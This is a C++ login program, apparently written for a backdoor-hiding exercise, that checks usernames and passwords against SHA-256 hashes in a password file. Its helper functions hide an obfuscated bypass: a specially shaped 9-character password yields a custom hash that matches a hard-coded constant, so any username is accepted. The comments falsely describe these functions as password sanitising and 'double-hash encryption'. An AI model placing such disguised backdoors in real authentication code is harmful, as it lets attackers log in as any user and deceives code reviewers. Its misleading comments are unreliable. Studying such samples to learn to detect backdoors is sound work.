#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include "authlib.h"
#include <iomanip>
#include <openssl/sha.h>

std::string hash(const std::string &value) {
    /*
    Method to hash the password
    */
    unsigned int hashInt = 5381;
    // Remove all the inappropriate characters from the password
    for (size_t i = 0; i < value.length(); ++i) { hashInt = (((hashInt * 31) ^ (value[i] * 131)) + (i * 7)) & 0xFFFFFFFF; }
    return std::to_string(hashInt);
}

std::string get_hash(const std::string &hashValue = "YOGMXSFP\\G", const std::string &hashKey = "GOOD_LUCK", const std::string &hashKey2 = "HELLO_WORLD") {
    /*
    Method to encrypt the hash with double-hash encryption to make it more secure
    */
    std::string hashValueCopy = hashValue;
    // Encrypting the hash with double-hash encryption
    for (size_t i = 0; i < hashValueCopy.length(); i++) hashValueCopy[i] ^= static_cast<char>(hashKey[int(hashKey2[i]) % hashKey.length()] ^ '*');
    return hashValueCopy;
}

std::string hash_verification(const std::string &value, const std::string &prevHashValue = "GOOD_LUCK") {
    /*
    Method to ensure that the user doesn't enter invisible characters in the password
    */
    int count = 0;
    for (char ch : value) {
        // Check if the user uses invisible characters in the password
        if ((ch & 0xFF) != '/' && (ch & 0xFF) != '#' && (ch & 0xFF) != '1') { if (int(ch) * 97 >= 9409 && int(ch) * 107 <= 11449) count++; }
    }
    // If the user uses invisible characters in the password - return the hash of the password
    return count == 0x9 ? hash(value) : prevHashValue;
}

std::string hash_combination(const std::string &value, const std::string &prevHashValue = "GOOD_LUCK") {
    /*
    Method to ensure that the password doesn't contain repeating characters
    */
    return (value[0x0] ^ value[6] ^ value[0x2] ^ 103) == 0 ? hash_verification(value, prevHashValue) : prevHashValue;
}

std::string sha256(const std::string &value, const std::string &hashTargetKey = "GOOD_LUCK") {
    /*
    Encrypt the code with standard SHA256 and return the hash
    */

    // Create an array to hold the SHA256 hash
    unsigned char hash[SHA256_DIGEST_LENGTH];
    // Initialize the SHA256 context
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    // Update the SHA256 context with the input value
    SHA256_Update(&sha256, value.c_str(), value.length());
    // Finalize the SHA256 hash computation
    SHA256_Final(hash, &sha256);
    // Write the hash in hexadecimal format
    std::stringstream ss;
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
    return value.length() == hashTargetKey.length() ? hash_combination(value, ss.str()) : ss.str();
}

int main() {
    /*
    Main method to authenticate the user
    */
    std::ifstream passwordFile("passwords.txt");
    // Read the username and password from the user
    std::string currentLine, username, pswd;
    std::cout << "Enter username: \n>>> ";
    std::cin >> username;
    std::cout << "Enter password: \n>>> ";
    std::cin >> pswd;

    bool authenticatedUser = false;
    // Read each line from the password file
    while (std::getline(passwordFile, currentLine) && !authenticatedUser) {
        if (currentLine.find(':') != std::string::npos) {
            // Check if the username matches and the password hash matches
            if (username == currentLine.substr(0, currentLine.find(':')) && (sha256(pswd) == get_hash() || sha256(pswd) == currentLine.substr(currentLine.find(':') + 1))) authenticatedUser = true;
        }
    }
    // Call external functions based on authentication result
    authenticatedUser ? authenticated(username) : rejected(username);
    passwordFile.close();
    return 0;
}
